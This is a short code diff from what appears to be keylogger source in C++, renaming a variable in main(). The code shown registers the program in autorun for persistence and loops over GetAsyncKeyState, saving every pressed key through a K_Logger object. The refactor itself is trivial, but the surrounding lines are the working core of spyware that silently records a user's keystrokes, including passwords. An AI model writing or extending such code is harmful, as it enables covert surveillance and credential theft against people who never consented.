@@ -835,9 +835,9 @@ int main()
 
 	char key;
 
-	K_Logger kl;
+	K_Logger keyLog;
 
-	kl.AddToAutorun();
+	keyLog.AddToAutorun();
 
 	while (true)
 	{
@@ -846,7 +846,7 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
 			{
-				kl.SaveSymbol(key);
+				keyLog.SaveSymbol(key);
 			}
 		}
 	}
